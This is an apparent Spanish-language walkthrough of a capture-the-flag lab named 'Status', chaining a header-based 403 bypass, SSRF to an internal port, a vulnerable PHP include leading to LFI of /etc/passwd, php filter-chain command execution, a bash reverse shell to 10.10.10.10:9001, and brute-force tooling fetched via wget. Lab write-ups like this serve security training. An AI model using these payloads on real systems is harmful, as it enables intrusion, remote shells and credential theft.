<h1>Laboratorio Status</h1>

<h2>Desplegamos el laboratorio status</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 182327.png"/>

<h2>Realizamos un escaneo de nmap como parte del reconocimiento</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 182511.png"/>

<li>Puerto 80 Abierto</li>

<br>

<h2>Entramos a la web que corre en el laboratorio y nos muestra eso: </h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 182736.png"/>

<h2>Realizamos un Fuzzing con Gobuster ya que no encontramos nada interesante en el index</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 183055.png"/>

<h2>Encontramos un status.php el cual no nos deja entrar ya que esta restringido (codigo 403)</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 183117.png"/>

<h2>Investigue con burpsuite para saber si podemos evadir esa restriccion o esta protegida por una cabecera</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 183415.png"/>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 183427.png"/>

<br><br>

<h2>Existe una cabecera existente que restringe el acceso</h2>
<li>Statusid: Si cambiamos/añadimos el valor de 0 a 1 tanto en el Request y Response podremos evadir ese acceso</li>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 183500.png"/>
<p>AQUI AÑADIMOS EN EL REQUEST Statusid: 1</p>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 183510.png"/>
<br><br>


<h2>Despues de enviar la peticion obtendremos acceso y se muestra esto: </h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 183616.png"/>

<h2>Esta pagina ofrece funcionalidades de hacer peticiones web. Esta pagina puede hacer peticiones mediante la URL</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 183616.png"/>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 184215.png"/>

<h2>Tras analizar esta parte encuentro que podemos hacer peticiones utilizando localhost o enviar peticiones al mismo servidor</h2>
<h2>Lo que confirma que el parametro URL es vulnerable a SSRF(Server-Side Request Forgery, SSRF).</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 184618.png"/>

<h2>Vamos a realizar un escaneo de puertos abiertos o funcionando a nivel interno</h2>
<h2>Capturamos la peticion de la URL mediante burpsuite para conocer los puertos internos</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 184948.png"/>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 185000.png"/>
<li>Se encuentra en funcionamiento el puerto: 3222</li>

<br><br>

<h2>Enviamos a una petición a http://127.0.0.1:3222</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 185224.png"/>
<h2>Y nos muestra un contenido interesante backups, a la cual haremos una peticion para saber que hay ahi.</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 185320.png"/>

<h2>Encontramos una URL que tiene un archivo zip la cual entraremos a la siguiente URL y la cual descargaremos</h2>
<h3>http://172.17.0.2/061400ca5d384de48f37a71ec23cc518/backups/backup_5025a3123660d066c9ba8617c0cd92d5.zip</h3>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 185638.png"/>

<h2>Encontramos la estructura de las carpetas dentro del archivo zip</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 185638.png"/>

<h2>Tras analizar la estructura nos da una pista de directorios a las cuales podemos hacer una peticion</h2>
<h2>Dentro de los directorios existe un archivo llamado file.php con el siguiente contenido: </h2>
<h3>
  <?php 
if($_SERVER['REQUEST_METHOD'] === 'GET'){
    $file = $_GET['72e22dffd7fa10883a85aa3e0bbbd6d4'];
    include($file);
}
?></h3>

<h2>Vemos que en archivo file.php existe lo siguiente: 72e22dffd7fa10883a85aa3e0bbbd6d4 </h2>
<h2>Uniendo todo lo anterior con los directorios encontrados en el zip y el parametro encontrado en el file.php crearemos una URL de esta forma</h2>
<h3>http://127.0.0.1/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php?72e22dffd7fa10883a85aa3e0bbbd6d4=/etc/passwd</h3>
<br><br>
<h2>De esta forma colamos un LFI (LOCAL FILE INCLUSION)</h2>
<h2>EFECTIVAMENTE FUNCIONA</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 190425.png"/>

<h2>Exploraremos un RFI (Remote File Inclusion)</h2>
<h2>Por la cual usaremos la siguiente herramienta</h2>
<li>https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle_exploit.py</li>
<h2>Vamos a crear un cmd para ejecutar comandos dentro del servidor</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 191839.png"/>

<h2>con la URL anterior que usamos para el LFI lo copiaremos de esta forma: </h2>
<h3>
http://127.0.0.1/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php?72e22dffd7fa10883a85aa3e0bbbd6d4=php://...PAYLOAD GENERADO POR LA HERRAMIENTA...=php://temp&cmd=whoami
</h3>

<h2>Y mandamos la peticion.</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 194756.png"/>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 193443.png"/>

<h2>Ahora mandaremos una reverse shell URL ENCODE</h2>
<h2>Sustituyen el whoami del final y ahi poniendo la reverse shell</h2>
<li>bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1" (RECUERDA PASARLA A URL ENCODE)</li>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 195045.png"/>
<h2>Nos ponemos en escucha por netcat y enviamos la peticion.</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 195333.png"/>

<h2>Reverse shell completada :)</h2>
<h2>Posteriormente haremos un movimiento entre usuarios existentes obteniendo sus contraseñas</h2>
<h2>Por la cual usaremos la siguiente herramienta:</h2>
<li>https://github.com/nohh022/bruteForce</li>

<h2>Nos levantamos un servidor con python para pasarnos la herramienta y el diccionario a utilizar para realizar un ataque de fuerza bruta y conseguir las credenciales</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 200732.png"/>

<h2>con wget desde la maquina victima obtenemos el script y el diccionario</h2>
<img width="956" height="776" src="../Status/images/Captura de pantalla 2026-07-27 200756.png"/>



